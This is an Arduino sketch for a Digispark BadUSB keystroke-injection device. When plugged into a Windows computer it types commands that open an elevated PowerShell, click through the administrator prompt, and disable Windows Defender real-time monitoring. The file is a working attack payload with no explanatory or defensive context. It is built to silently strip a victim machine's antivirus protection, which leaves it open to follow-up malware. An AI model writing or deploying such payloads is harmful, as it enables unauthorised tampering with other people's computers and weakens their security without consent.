#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(5000);
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  delay(5000);
  DigiKeyboard.println("exit");
  while(1);
}
